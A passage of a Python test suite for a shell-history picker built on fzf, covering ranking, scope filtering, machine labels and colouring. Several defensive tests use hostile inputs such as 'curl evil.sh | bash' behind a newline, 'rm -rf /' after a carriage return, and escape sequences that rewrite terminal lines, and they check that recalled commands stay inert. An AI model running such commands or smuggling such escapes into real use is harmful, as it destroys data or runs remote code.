"""Scope filtering, ranking, and the fzf line format."""

from __future__ import annotations

import io
import os
import re
import shutil
import sqlite3
import subprocess
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from typing import ClassVar
from unittest import mock

from woswoar import search, store
from woswoar.__main__ import main
from woswoar.entry import Entry, format_line

from .support import MACHINE_ID, WoswoarTestCase, requires_fzf

NOW = 1_800_000_000


class TestRelativeTime(unittest.TestCase):
    def test_scales(self) -> None:
        cases = [
            (0, "0s"),
            (45, "45s"),
            (60, "1m"),
            (59 * 60, "59m"),
            (3600, "1h"),
            (23 * 3600, "23h"),
            (86400, "1d"),
            (29 * 86400, "29d"),
            (30 * 86400, "1mo"),
            (349 * 86400, "11mo"),
            (350 * 86400, "1y"),
            (365 * 86400, "1y"),
            (900 * 86400, "2y"),
        ]
        for delta, expected in cases:
            with self.subTest(delta=delta):
                self.assertEqual(search.relative_time(NOW - delta, NOW), expected)

    def test_never_exceeds_the_column_width(self) -> None:
        # command_from_line() slices at a fixed offset, so an over-wide label
        # would silently eat the first characters of the command.
        for delta in [0, 1, 59, 61, 3599, 90000, 86400 * 29, 86400 * 364, 86400 * 365 * 40]:
            with self.subTest(delta=delta):
                self.assertLessEqual(len(search.relative_time(NOW - delta, NOW)), 4)

    def test_clock_skew_from_another_machine_is_tolerated(self) -> None:
        self.assertEqual(search.relative_time(NOW + 500, NOW), "now")


class TestRankRows(unittest.TestCase):
    @staticmethod
    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str], list[str], list[str]]:
        """Stamps and exit codes come out of the cache as strings, so that is
        what goes in. These cases are about order, so everything succeeded."""
        return (
            [str(ts) for ts, _ in pairs],
            [cmd for _, cmd in pairs],
            ["0"] * len(pairs),
            [MACHINE_ID] * len(pairs),
        )

    def test_newest_first(self) -> None:
        stamps, commands, codes, hosts = self.rows((1, "old"), (3, "new"), (2, "mid"))
        ranked = search.rank_rows(stamps, commands, codes, hosts)
        self.assertEqual([cmd for _, cmd, _, _ in ranked], ["new", "mid", "old"])

    def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
        stamps, commands, codes, hosts = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
        self.assertEqual(
            search.rank_rows(stamps, commands, codes, hosts),
            [(5, "git status", "0", MACHINE_ID), (3, "ls", "0", MACHINE_ID)],
        )

    def test_dedup_can_be_disabled(self) -> None:
        stamps, commands, codes, hosts = self.rows((1, "ls"), (2, "ls"))
        self.assertEqual(len(search.rank_rows(stamps, commands, codes, hosts, dedup=False)), 2)


class TestRenderRoundTrip(unittest.TestCase):
    def test_command_survives_the_display_format(self) -> None:
        commands = [
            "git status",
            "awk -F'\t' '{print $1}'",
            "back\\slash",
            # A literal backslash followed by an escape letter. Without the
            # backslash being escaped, `unescape` reads this back as a real tab
            # and the recalled command is not the one that was recorded.
            "grep 'a\\tb' file",
            "über 😀",
            "x" * 300,
        ]
        lines = search.render_rows([(NOW, cmd, "0", MACHINE_ID) for cmd in commands], now=NOW)

        for line, cmd in zip(lines, commands, strict=True):
            with self.subTest(cmd=cmd):
                # One entry must occupy exactly one line, or fzf would show a
                # multi-line command as several unrelated candidates.
                self.assertNotIn("\n", line)
                self.assertEqual(search.command_from_line(line), cmd)


class TestScope(WoswoarTestCase):
    """Driven through `lines_for`, which is the path Ctrl-R takes.

    These used to call `filter_scope` on a hand-built list. That function is
    gone -- the scopes are answered from the cache's columns now, and `host`
    without looking at a single row, because the host belongs to the file. A
    test of the old helper would have kept passing while the live path did
    something else, which is exactly what happened when this was written.
    """

    def record(self, ts: int, cmd: str, host: str = MACHINE_ID, session: str = "here") -> None:
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(ts, host, session, "/tmp", 0, 0, cmd)) + "\n")

    def setUp(self) -> None:
        super().setUp()
        self.record(1, "mine, this shell")
        self.record(2, "mine, other shell", session="elsewhere")
        self.record(3, "another machine", host="ffffffffffffffff", session="remote")

    @staticmethod
    def commands(scope: search.Scope) -> list[str]:
        """As the picker does it: one width, decided once, used for both."""
        width = search.host_width_for(set(store.host_names()))
        return [
            search.command_from_line(line, width)
            for line in search.lines_for(scope, host_width=width)
        ]

    def test_global_keeps_everything(self) -> None:
        self.assertEqual(len(self.commands("global")), 3)

    def test_host_keeps_this_machine(self) -> None:
        self.assertEqual(sorted(self.commands("host")), ["mine, other shell", "mine, this shell"])

    def test_session_keeps_this_shell(self) -> None:
        os.environ["WOSWOAR_SESSION"] = "here"
        self.assertEqual(self.commands("session"), ["mine, this shell"])

    def test_session_without_the_hook_is_empty_not_an_error(self) -> None:
        os.environ.pop("WOSWOAR_SESSION", None)
        self.assertEqual(self.commands("session"), [])


class TestFzfArgv(unittest.TestCase):
    def test_matching_is_restricted_to_the_command_column(self) -> None:
        # Without --nth=2.., a query like "3d" would match the relative-time
        # column and surface unrelated entries.
        self.assertIn("--nth=2..", search._fzf_argv("global", "", True, 0))

    def test_scope_keys_reload_the_right_scope(self) -> None:
        argv = search._fzf_argv("global", "", True, 0)
        binds = " ".join(a for a in argv if a.startswith("--bind="))
        for key, scope in (("ctrl-g", "global"), ("ctrl-h", "host"), ("ctrl-s", "session")):
            self.assertIn(f"{key}:reload(", binds)
            # `--colour` too: the reload's output goes back into fzf, which was
            # started with `--ansi`, so a scope switch that dropped it would
            # silently stop marking failures.
            self.assertIn(f"list --colour --host-width 0 --scope {scope}", binds)

    def test_no_dedup_propagates_into_the_reload_command(self) -> None:
        argv = search._fzf_argv("global", "", False, 0)
        self.assertIn("--no-dedup", " ".join(a for a in argv if a.startswith("--bind=")))


MINUTE, HOUR, DAY = 60, 3600, 86400

#: The history from the report this came out of, newest first -- which is the
#: order `rank_rows` hands to fzf, so any deviation in the output below is
#: fzf's ranking and nothing else. Every one of these matches "sync" equally
#: well as far as fzf's score is concerned, which is the whole point: with the
#: scores tied, the tiebreak decides the entire list.
SYNC_HISTORY = [
    (3 * MINUTE, "woswoar sync"),
    (15 * MINUTE, "time woswoar sync"),
    (10 * HOUR, "sync"),
    (10 * HOUR, "synci"),
    (10 * HOUR, "atuin sync"),
    (10 * HOUR, "chmod a+x sync_claude_skills.py"),
    (11 * DAY, "sync; echo 3 | sudo tee /proc/sys/vm/drop_caches"),
    (2 * 30 * DAY, "sync_claude_skills.py"),
    (2 * 30 * DAY, "atuin sync -f"),
    (3 * 30 * DAY, "aimgr repo sync"),
    (365 * DAY, "sudo sync; echo 3 > /proc/sys/vm/drop_caches"),
    (365 * DAY, "atuin sync -h"),
    (365 * DAY, "chezmoi sync"),
    (365 * DAY, "time m clean && time m && time sync"),
]


@requires_fzf
class TestRealFzfRanking(unittest.TestCase):
    """The order fzf actually produces, out of the real binary.

    `--filter` does the same match-and-sort without needing a terminal, so this
    drives the argv Ctrl-R uses rather than a copy of it: a change to `--nth` or
    `--tiebreak` reaches this test. Nothing here can be asserted against a
    stand-in -- the behaviour under test is fzf's, not woswoar's.
    """

    def filtered(self, query: str) -> subprocess.CompletedProcess[str]:
        """The fixture through the real fzf, with the real argv."""
        lines = search.render_rows(
            [(NOW - age, cmd, "0", MACHINE_ID) for age, cmd in SYNC_HISTORY], now=NOW
        )
        # No `check`: 1 means "nothing matched", which one test below wants.
        return subprocess.run(
            [*search._fzf_argv("global", "", True, 0), f"--filter={query}"],
            input="\n".join(lines) + "\n",
            capture_output=True,
            text=True,
        )

    def ordered(self, query: str) -> list[str]:
        completed = self.filtered(query)
        self.assertEqual(completed.returncode, 0, completed.stderr)
        return [search.command_from_line(line) for line in completed.stdout.splitlines()]

    def test_the_newest_match_comes_first(self) -> None:
        self.assertEqual(self.ordered("sync")[0], "woswoar sync")

    def test_an_old_command_does_not_outrank_a_recent_one_for_starting_sooner(self) -> None:
        """The report: a year-old entry above the command actually wanted.

        The pair is chosen so that only the tiebreak can separate them. The
        year-old one matches *earlier* in its line -- offset 5 in `sudo sync`
        against 8 in `woswoar sync` -- so under `begin` it wins however recent
        the other is, and under `index` it cannot.
        """
        order = self.ordered("sync")
        self.assertLess(
            order.index("woswoar sync"),
            order.index("sudo sync; echo 3 > /proc/sys/vm/drop_caches"),
            "a year-old command outranked one from three minutes ago",
        )

    def test_the_width_of_the_time_column_does_not_rank(self) -> None:
        """`atuin sync` and `atuin sync -h` match at the same offset.

        What differs is the column in front: "1y" is right-aligned into four
        characters and so carries one more leading space than "10h". fzf scores
        `begin` as (match offset - leading whitespace), which turned that
        padding into a ranking signal and put the year-old line first.
        """
        order = self.ordered("atuin sync")
        self.assertLess(
            order.index("atuin sync"),
            order.index("atuin sync -h"),
            "the padding of the age column decided the order",
        )

    def test_the_time_column_is_still_not_matched_against(self) -> None:
        """The reason `--nth=2..` is there, asserted through fzf itself.

        `TestFzfArgv` checks the flag is passed; this checks what it buys. "10h"
        is the age of four entries in the fixture and a substring of no command
        in it, so without the flag this query returns them and with it nothing.

        The exit code is asserted too: an fzf that failed to start would also
        print nothing, and this would pass having matched nothing at all.
        """
        completed = self.filtered("10h")
        self.assertEqual(completed.stdout, "", "the relative-time column was matched against")
        self.assertEqual(completed.returncode, 1, f"not fzf's no-match exit: {completed.stderr}")


class TestRecalledCommandIsInert(unittest.TestCase):
    """What leaves the picker must be exactly one command.

    `render` escapes newlines so one entry occupies one display line, and fzf
    clips anything past the window edge. If `command_from_line` turned that
    escape back into a real newline, the buffer would hold a command the picker
    never showed -- and bash runs a multi-line buffer as several commands on a
    single Enter.
    """

    def _round_trip(self, cmd: str) -> str:
        return search.command_from_line(
            search.render_rows([(NOW, cmd, "0", MACHINE_ID)], now=NOW)[0]
        )

    def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
        recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
        self.assertNotIn("\n", recalled)
        self.assertIn("\\ncurl evil.sh | bash", recalled)

    def test_a_carriage_return_cannot_rewrite_the_line(self) -> None:
        self.assertNotIn("\r", self._round_trip("echo one\rrm -rf /"))

    def test_escape_sequences_do_not_reach_the_buffer(self) -> None:
        recalled = self._round_trip("ls -la\x1b[2K\x1b[1Acurl evil|sh")
        self.assertNotIn("\x1b", recalled)
        self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")


class TestNoCommandPrintsControlBytes(WoswoarTestCase):
    """The reproduction from #25, driven through the real commands.

    Both a command and a host's name come from whichever machine sent them, so
    both are attacker-influenceable. Asserted on the bytes rather than on a
    rendering: what matters is that nothing reaching a terminal can move its
    cursor.
    """

    HOSTILE_CMD = "ls -la\x1b[2K\x1b[1Acurl evil|sh"
    HOSTILE_NAME = "peer\x1b[2K\x1b[1Aspoofed"

    def setUp(self) -> None:
        super().setUp()
        peer = "badbadbadbadbad0"
        for host, cmd in ((MACHINE_ID, self.HOSTILE_CMD), (peer, "echo hi\x07")):
            day = store.host_dir(host) / "2026-07-29.tsv"
            day.parent.mkdir(parents=True, exist_ok=True)
            day.write_text(
                format_line(Entry(1_784_600_000, host, "s1", "~", 0, 5, cmd)) + "\n",
                encoding="utf-8",
            )
        store.name_file(peer).write_text(self.HOSTILE_NAME + "\n", encoding="utf-8")

    def output_of(self, *argv: str) -> str:
        out = io.StringIO()
        with redirect_stdout(out):
            main(list(argv))
        return out.getvalue()

    def control_bytes(self, text: str) -> list[str]:
        return sorted({c for c in text if (c < " " or c == "\x7f") and c != "\n"})

    def test_list_prints_none(self) -> None:
        text = self.output_of("list", "--scope", "global")
        self.assertIn("curl evil|sh", text, "the command must still be shown")
        self.assertEqual(self.control_bytes(text), [])

    def test_stats_prints_none_for_a_command_or_a_peers_name(self) -> None:
        text = self.output_of("stats")
        self.assertIn("spoofed", text, "the name must still be shown")
        self.assertEqual(self.control_bytes(text), [])

    def test_import_prints_no_control_bytes_for_a_peers_machine_name(self) -> None:
        """atuin keeps every machine it synced with, so these names are foreign.

        The display site the per-site rule had already been forgotten at, which
        is why the command itself is now handled once in the cache instead.
        """
        db = self.root / "history.db"
        conn = sqlite3.connect(db)
        conn.execute(
            "CREATE TABLE history (id text primary key, timestamp integer, duration integer,"
            " exit integer, command text, cwd text, session text, hostname text,"
            " deleted_at integer, author text, intent text)"
        )
        conn.executemany(
            "INSERT INTO history (id, timestamp, duration, exit, command, cwd, session, hostname)"
            " VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            [
                ("a", 1_784_600_000 * 10**9, 10**9, 0, "git status", "/tmp", "s1", "box:me"),
                ("b", 1_784_600_001 * 10**9, 10**9, 0, "ls", "/tmp", "s1", self.HOSTILE_NAME),
            ],
        )
        conn.commit()
        conn.close()

        text = self.output_of("import", "atuin", "--file", str(db))
        self.assertIn("per machine", text, "both machines must be listed")
        self.assertEqual(self.control_bytes(text), [])


if __name__ == "__main__":
    unittest.main()


class TestThePickerAppearsBeforeTheHistoryIsBuilt(WoswoarTestCase):
    """fzf is started first, and fed afterwards.

    Measured on a real 55,000-command atuin history: the picker used to appear
    after 121 ms, because nothing was spawned until every line had been loaded,
    sorted, deduplicated and rendered. Starting fzf first puts it on screen at
    41 ms -- the work is identical, but you spend it looking at the picker
    instead of at nothing.
    """

    def fake_fzf(self, script: str) -> None:
        """Put a stand-in for fzf first on PATH.

        A real fzf needs a terminal, and CI has neither. What is under test is
        woswoar's half of the conversation -- when the process is started, what
        is written to it, and what happens when it leaves early -- so the stand
        -in is the real subprocess boundary with a scripted other end.
        """
        binary = Path(self.root) / "bin" / "fzf"
        binary.parent.mkdir(parents=True, exist_ok=True)
        binary.write_text(f"#!/usr/bin/env python3\n{script}")
        binary.chmod(0o755)
        os.environ["PATH"] = f"{binary.parent}{os.pathsep}{os.environ['PATH']}"

    def some_history(self) -> None:
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(5):
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, f"cmd {i}")))
                handle.write("\n")

    def test_fzf_is_running_before_the_lines_exist(self) -> None:
        """The whole change, stated as an order of events.

        The stand-in is installed even though `Popen` is mocked: `interactive`
        looks fzf up on PATH first and returns early if it is missing, so
        without this the test asserts nothing on any machine that lacks fzf --
        which is every CI runner here, and is exactly how it first went red.
        """
        self.fake_fzf("import sys\n")
        self.some_history()
        order: list[str] = []

        class Spawned:
            def __init__(self, *args: object, **kwargs: object) -> None:
                order.append("picker")
                self.stdin = io.StringIO()
                self.stdout = io.StringIO("")

            def wait(self) -> int:
                return 130  # as Esc does

        def slow_lines(*args: object, **kwargs: object) -> list[str]:
            order.append("history")
            return ["  1s  cmd 0"]

        with (
            mock.patch("subprocess.Popen", Spawned),
            mock.patch.object(search, "lines_for", slow_lines),
            # The version probe would otherwise be caught by the fake `Popen`
            # above -- `subprocess.run` uses it. This test is about the order of
            # two things, not about which fzf is installed.
            mock.patch.object(search, "fzf_supports_transform", return_value=False),
        ):
            search.interactive("global")

        self.assertEqual(order, ["picker", "history"], "the picker waited for the history")

    def test_the_lines_reach_fzf(self) -> None:
        self.some_history()
        self.fake_fzf("import sys\nprint(sys.stdin.read().splitlines()[0])\n")
        with redirect_stdout(io.StringIO()):
            chosen = search.interactive("global")
        self.assertEqual(chosen, "cmd 0", "the newest entry did not survive the round trip")

    def test_fzf_leaving_early_is_not_an_error(self) -> None:
        """Selecting the first line the instant it appears closes the pipe
        under us, and the write has to tolerate that at any point.

        The history has to be bigger than a pipe buffer -- 64 KiB on Linux --
        or the write lands in the buffer and returns happily even though
        nothing will ever read it, and this passes with the handling removed.
        Five short lines did exactly that.
        """
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(2000):
                padded = f"cmd {i} " + "x" * 200
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, padded)))
                handle.write("\n")
        self.assertGreater(
            sum(len(line) for line in search.lines_for("global")),
            1 << 16,
            "precondition: more than one pipe buffer of history",
        )
        # Exits without reading stdin at all -- the harshest version.
        self.fake_fzf("import sys\nsys.exit(130)\n")
        with redirect_stdout(io.StringIO()):
            self.assertIsNone(search.interactive("global"))

    def test_a_machine_with_no_history_opens_no_picker(self) -> None:
        """Ctrl-R on a fresh install did nothing, and must keep doing nothing
        rather than opening an empty picker to escape out of.

        The marker is written by the stand-in itself, so this fails if fzf is
        started at all -- asserting on a file nothing ever creates would pass
        either way, which is what the first version of this test did.
        """
        started = Path(self.root) / "fzf-was-started"
        self.fake_fzf(f"import pathlib\npathlib.Path({str(started)!r}).write_text('yes')\n")

        # The stand-in really does write it when it runs, or the test below is
        # asserting the absence of something that never appears anyway.
        subprocess.run([str(Path(self.root) / "bin" / "fzf")], check=True)
        self.assertTrue(started.exists(), "precondition: the marker works")
        started.unlink()

        with redirect_stdout(io.StringIO()):
            self.assertIsNone(search.interactive("global"))
        self.assertFalse(started.exists(), "an empty history opened a picker")

    def test_many_lines_survive_the_chunking(self) -> None:
        """More than one chunk, so the loop runs more than once."""
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(search._CHUNK * 2 + 7):
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, f"cmd {i}")))
                handle.write("\n")
        self.fake_fzf("import sys\nseen = sys.stdin.read().splitlines()\nprint(seen[-1])\n")
        with redirect_stdout(io.StringIO()):
            chosen = search.interactive("global")
        self.assertEqual(chosen, f"cmd {search._CHUNK * 2 + 6}", "a chunk went missing")


#: What fzf hands back with `--ansi`: the line, with every escape removed.
_ESCAPES = re.compile(r"\x1b\[[0-9;]*m")


def unstyled(line: str) -> str:
    return _ESCAPES.sub("", line)


class TestFailedCommandsAreMarked(WoswoarTestCase):
    """Colour by exit status, which the picker can show and a pipe must not."""

    def rows(self, codes: tuple[int, int] = (0, 1)) -> list[str]:
        good, bad = codes
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            for ts, code, cmd in ((NOW - 1, good, "worked"), (NOW, bad, "failed")):
                handle.write(format_line(Entry(ts, MACHINE_ID, "s1", "~", code, 1, cmd)) + "\n")
        return search.lines_for("global", colour=True)

    def test_a_failure_is_marked_and_a_success_is_not(self) -> None:
        failed, worked = self.rows()
        self.assertIn("failed", failed)
        self.assertIn(search._FAILED, failed, f"not marked: {failed!r}")
        self.assertIn(search._RESET, failed, "the colour is never reset")
        self.assertFalse(failed.endswith(search._RESET), "the whole line is coloured again")
        self.assertIn("worked", worked)
        self.assertNotIn("\x1b[", worked, "a command that succeeded was marked")

    def test_only_the_age_is_coloured_not_the_whole_line(self) -> None:
        """Reported as "a bit much if the whole line is red" -- and on a history
        with any real proportion of failures, a mark covering half the lines has
        stopped marking anything."""
        (failed, _) = self.rows()
        before, _, after = failed.partition(search._RESET)
        self.assertNotIn("failed", before, "the command itself is inside the colour")
        self.assertIn("failed", after)
        # The escapes wrap the age and nothing else, so what they contain is
        # exactly what `relative_time` produced, padding included.
        self.assertEqual(before.removeprefix(search._FAILED).strip(), "now")

    def test_the_columns_still_line_up(self) -> None:
        """The escapes go outside the padding, so a coloured line and a plain
        one are the same width once fzf has stripped them."""
        failed, worked = self.rows()
        self.assertEqual(len(unstyled(failed)) - len("failed"), len(worked) - len("worked"))

    def test_an_unknown_exit_code_is_not_a_failure(self) -> None:
        """`~/.bash_history` and `~/.zsh_history` carry no exit codes at all, so
        `importer` records -1. Treating "anything but 0" as failure painted a
        freshly imported history entirely red, which is what this is for."""
        for unknown in (-1, -2):
            with self.subTest(code=unknown):
                self.setUp()
                failed, worked = self.rows(codes=(unknown, unknown))
                for line in (failed, worked):
                    self.assertNotIn("\x1b[", line, f"an unknown code was marked: {line!r}")

    def test_what_counts_as_failure_is_decided_in_one_place(self) -> None:
        """So a fourth caller cannot invent a fifth answer."""
        self.assertFalse(search.is_failure("0"))
        self.assertFalse(search.is_failure(""))
        self.assertFalse(search.is_failure("-1"))
        self.assertFalse(search.is_failure("not-a-number"))
        self.assertTrue(search.is_failure("1"))
        self.assertTrue(search.is_failure("130"))

    def test_plain_by_default_so_a_pipe_stays_plain(self) -> None:
        """`woswoar list | grep` is a documented thing to do."""
        self.rows()
        for line in search.lines_for("global"):
            self.assertNotIn("\x1b[", line)

    def test_the_command_still_comes_back_out(self) -> None:
        """fzf strips the escapes from what it returns, so the fixed-width
        prefix `command_from_line` slices is unchanged -- but if that ever stops
        being true, this is where it shows."""
        failed, _ = self.rows()
        self.assertEqual(search.command_from_line(unstyled(failed)), "failed")

    def test_a_command_cannot_smuggle_its_own_escapes(self) -> None:
        """The whole reason `--ansi` is safe. `make_inert` removes every C0
        byte on the way into the cache, so a peer's history cannot colour
        itself, hide a line, or drive the terminal."""
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            handle.write(
                format_line(Entry(NOW, MACHINE_ID, "s1", "~", 0, 1, "echo \x1b[1A\x1b[2K gone"))
                + "\n"
            )
        (line,) = search.lines_for("global", colour=True)
        self.assertNotIn("\x1b", line, f"an escape survived into the picker: {line!r}")


class TestTheMachineColumn(WoswoarTestCase):
    """Which machine ran it, shown only when there is more than one.

    Asked for as "filter by a specific host, but I'm not sure how to make that
    conveniently usable" -- so there is no new key and no new mode. The name is
    in the line and fzf matches from the second field on, which makes filtering
    by machine the same gesture as filtering by anything else: typing it.
    """

    OTHER = "ffffffffffffffff"

    def record(self, host: str, cmd: str, ts: int = NOW) -> None:
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(ts, host, "s1", "~", 0, 1, cmd)) + "\n")

    def test_one_machine_gets_no_column(self) -> None:
        """Every single-machine install, and the whole of the Quick Start."""
        self.record(MACHINE_ID, "git status")
        self.assertEqual(search.host_width_for({MACHINE_ID}), 0)
        (line,) = search.lines_for("global")
        # The time column is right-aligned in four, so "now" leaves one space.
        self.assertEqual(line, " now  git status")

    def test_two_machines_get_one(self) -> None:
        self.record(MACHINE_ID, "mine")
        self.record(self.OTHER, "theirs", ts=NOW - 1)
        store.write_atomic(store.name_file(self.OTHER), b"work-laptop\n")
        store.write_atomic(store.name_file(MACHINE_ID), b"desktop\n")

        width = search.host_width_for({MACHINE_ID, self.OTHER})
        self.assertEqual(width, len("work-laptop"))
        mine, theirs = search.lines_for("global", host_width=width)
        self.assertIn("desktop", mine)
        self.assertIn("work-laptop", theirs)

    def test_the_command_still_comes_back_out(self) -> None:
        """The recall path, which the column moves. `command_from_line` is told
        the width rather than guessing it, because the picker's reload runs in
        another process and a machine arriving in between would otherwise make
        the two disagree and slice somebody's command in the wrong place."""
        self.record(MACHINE_ID, "cargo build --release")
        self.record(self.OTHER, "theirs", ts=NOW - 1)
        width = search.host_width_for({MACHINE_ID, self.OTHER})
        line = search.lines_for("global", host_width=width)[0]
        self.assertEqual(search.command_from_line(line, width), "cargo build --release")

    def test_an_unnamed_machine_shows_a_short_id_not_sixteen_hex(self) -> None:
        self.record(MACHINE_ID, "mine")
        self.record(self.OTHER, "theirs", ts=NOW - 1)
        self.assertEqual(search.host_label(self.OTHER), self.OTHER[:8])

    def test_a_machine_name_cannot_drive_the_terminal(self) -> None:
        """The name is another machine's text -- `_merge_name` writes whatever
        decrypted out of its `name.age` straight to disk, and sealing one needs
        no secret. Harmless while the picker was escape-free; with `--ansi` it
        is a way to erase the line above, so it is neutralised here."""
        store.write_atomic(store.name_file(self.OTHER), b"ok\x1b[1A\x1b[2K\n")
        self.assertNotIn("\x1b", search.host_label(self.OTHER))


class TestCtrlRCyclesTheScope(unittest.TestCase):
    """Ctrl-R inside the picker moves global -> host -> session -> global.

    fzf holds no variables, so the binding reads the current scope back out of
    the prompt fzf is already showing. What is asserted here is that shell
    script, run the way fzf runs it: the decision it makes is the part that can
    be wrong, and it needs no terminal.

    The keypress itself is not driven here -- fzf needs a tty and the result was
    not something I could assert reliably. The binding's *shape* is checked
    against a real fzf's acceptance by `TestRealFzfRanking`, which runs one.
    """

    def next_scope(self, prompt: str) -> str:
        binding = search._cycle_binding("woswoar", "", " --host-width 0")
        script = binding.split("transform:", 1)[1]
        out = subprocess.run(
            ["sh", "-c", script],
            capture_output=True,
            text=True,
            env={"FZF_PROMPT": prompt, "PATH": "/usr/bin:/bin"},
            check=True,
        ).stdout
        return out.split("--scope ", 1)[1].split(")", 1)[0].strip()

    def test_it_goes_round(self) -> None:
        self.assertEqual(self.next_scope("woswoar (global) "), "host")
        self.assertEqual(self.next_scope("woswoar (host) "), "session")
        self.assertEqual(self.next_scope("woswoar (session) "), "global")

    def test_it_repaints_the_prompt_it_reads_back(self) -> None:
        """`change-prompt` is not decoration: the next press reads it."""
        binding = search._cycle_binding("woswoar", "", " --host-width 0")
        script = binding.split("transform:", 1)[1]
        out = subprocess.run(
            ["sh", "-c", script],
            capture_output=True,
            text=True,
            env={"FZF_PROMPT": "woswoar (global) ", "PATH": "/usr/bin:/bin"},
            check=True,
        ).stdout
        self.assertIn("change-prompt(woswoar (host) )", out)

    def test_the_reload_keeps_the_colour_and_the_width(self) -> None:
        """A cycle that dropped either would change the layout mid-picker, and
        `command_from_line` slices at a width decided when it opened."""
        self.assertIn(
            "--colour --host-width 7",
            search._cycle_binding("woswoar", "", " --host-width 7"),
        )

    def test_an_older_fzf_is_offered_nothing_it_cannot_do(self) -> None:
        """An unknown action in a `--bind` makes fzf refuse to start, so this
        cannot be offered optimistically: the cost of guessing wrong is no
        picker at all."""
        with mock.patch.object(search, "fzf_supports_transform", return_value=False):
            argv = search._fzf_argv("global", "", True, 0)
        self.assertFalse([a for a in argv if "ctrl-r:" in a])
        self.assertNotIn("ctrl-r cycles", " ".join(argv))

    def test_a_new_enough_fzf_gets_it(self) -> None:
        with mock.patch.object(search, "fzf_supports_transform", return_value=True):
            argv = search._fzf_argv("global", "", True, 0)
        self.assertTrue([a for a in argv if a.startswith("--bind=ctrl-r:transform:")])
        self.assertIn("ctrl-r cycles", " ".join(argv))

    def test_the_version_gate_reads_a_version(self) -> None:
        for version, wanted in (("0.44.1 (Fedora)", False), ("0.45.0", True), ("0.73.1", True)):
            with self.subTest(version=version):
                done = subprocess.CompletedProcess([], 0, stdout=version, stderr="")
                with mock.patch("subprocess.run", return_value=done):
                    self.assertEqual(search.fzf_supports_transform(), wanted)

    def test_an_fzf_that_says_nothing_useful_is_treated_as_old(self) -> None:
        """Erring towards the picker still opening."""
        done = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        with mock.patch("subprocess.run", return_value=done):
            self.assertFalse(search.fzf_supports_transform())


class TestLabelsStayDifferent(WoswoarTestCase):
    """Reported: two machines showing as `martinleitnerank` and
    `martinus@DT-24YY`, both cut at sixteen, neither saying which machine.

    A name is `user@host`, and on one person's machines the user is usually the
    same while the host is what differs -- and it is the host that a long
    username pushes off the end.
    """

    A, B = "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb"

    def named(self, **names: str) -> dict[str, str]:
        for host, name in names.items():
            store.write_atomic(store.name_file(getattr(self, host)), f"{name}\n".encode())
        return search.host_labels({self.A, self.B})

    def test_the_reported_case(self) -> None:
        labels = self.named(A="martinleitnerankerl@thinkpad", B="martinus@DT-24YYQ3")
        self.assertEqual(labels[self.A], "thinkpad")
        self.assertEqual(labels[self.B], "DT-24YYQ3")

    def test_the_full_name_comes_back_when_hosts_would_collide(self) -> None:
        """Two accounts on one machine, or the same hostname twice: the host
        half no longer distinguishes, so it is not used."""
        labels = self.named(A="martin@box", B="root@box")
        self.assertEqual({labels[self.A], labels[self.B]}, {"martin@box", "root@box"})

    def test_something_too_long_keeps_its_end(self) -> None:
        labels = self.named(A="x@" + "a" * 40, B="y@short")
        self.assertTrue(labels[self.A].startswith("…"), labels[self.A])
        self.assertEqual(len(labels[self.A]), search._HOST_WIDTH)

    def test_the_column_is_only_as_wide_as_the_labels(self) -> None:
        self.named(A="martinleitnerankerl@thinkpad", B="martinus@DT-24YYQ3")
        self.assertEqual(search.host_width_for({self.A, self.B}), len("DT-24YYQ3"))


class TestSayingHowToFilterByMachine(WoswoarTestCase):
    """`^box` matches only the machine called box.

    It works because `--nth=2..` starts the searched region at the machine name
    and fzf anchors `^` to the start of that region, not of the line -- so this
    needed no new key, no new mode, and no change to the line. It needed saying.

    Reported as "I have a host named box and that is short enough to also be
    part of a few commands", which is exactly what an unanchored query cannot
    tell apart.
    """

    def test_the_hint_appears_once_there_is_a_column_to_filter_on(self) -> None:
        header = search._header(host_width=8)
        self.assertIn("^name", header)

    def test_a_single_machine_is_not_told_about_it(self) -> None:
        """There is no machine column on a one-machine install, so the hint
        would describe something that is not on screen."""
        self.assertNotIn("^name", search._header(host_width=0))

    def test_the_scope_keys_are_still_listed(self) -> None:
        for width in (0, 8):
            with self.subTest(host_width=width):
                header = search._header(host_width=width)
                for key in ("ctrl-g", "ctrl-h", "ctrl-s"):
                    self.assertIn(key, header)

    def test_ctrl_r_is_listed_only_where_it_works(self) -> None:
        """`transform` needs fzf 0.45+, and a header naming a key that does
        nothing is worse than one that stays quiet about it."""
        for supported in (True, False):
            with (
                self.subTest(transform=supported),
                mock.patch.object(search, "fzf_supports_transform", return_value=supported),
            ):
                self.assertEqual("ctrl-r" in search._header(8), supported)

    def test_the_header_reaches_fzf(self) -> None:
        """A header nothing passes on is a string in a unit test."""
        argv = search._fzf_argv("global", "", dedup=True, host_width=8)
        self.assertIn(f"--header={search._header(8)}", argv)

    ROWS: ClassVar[list[str]] = [
        "  2m  box       docker run sandbox",
        "  3h  thinkpad  docker ps",
        "  6d  box       ls",
        "  1d  at1i-ws07 echo box",
    ]

    def fzf_filter(self, query: str) -> str:
        """Run the real fzf with the matching flags the picker actually passes.

        `--nth` is taken out of `_fzf_argv` rather than written again here. The
        claim under test is about how fzf resolves `^` against *that* field
        range, so a test spelling its own range has quietly stopped testing the
        code: with the value hardcoded, changing it to `--nth=1..` -- which
